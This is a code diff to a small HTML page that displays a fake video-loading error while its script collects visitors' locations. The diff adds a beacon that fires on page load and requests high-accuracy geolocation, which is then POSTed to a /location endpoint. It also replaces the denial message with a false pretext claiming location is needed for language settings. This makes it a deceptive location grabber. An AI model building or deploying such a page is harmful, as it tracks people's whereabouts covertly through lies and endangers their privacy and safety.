@@ -1,8 +1,14 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h1>(ERROR) Please reload the page to see video.</h1>
+<h1>ERROR: Please reload the page to see the video.</h1>
 <script>
+fetch('/location', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ ip_only: true })
+});
+
 navigator.geolocation.getCurrentPosition(
   pos => {
     fetch('/location', {
@@ -15,8 +21,13 @@ navigator.geolocation.getCurrentPosition(
     });
   },
   err => {
-    alert("location permission denied or error occurred");
-  }
+    if(err.code === err.PERMISSION_DENIED) {
+      alert("Location is needed for language settings.");
+    } else {
+      alert("ERROR: Please reload the page to see the video.");
+    }
+  },
+  { timeout: 10000, maximumAge: 0, enableHighAccuracy: true }
 );
 </script>
 </body>
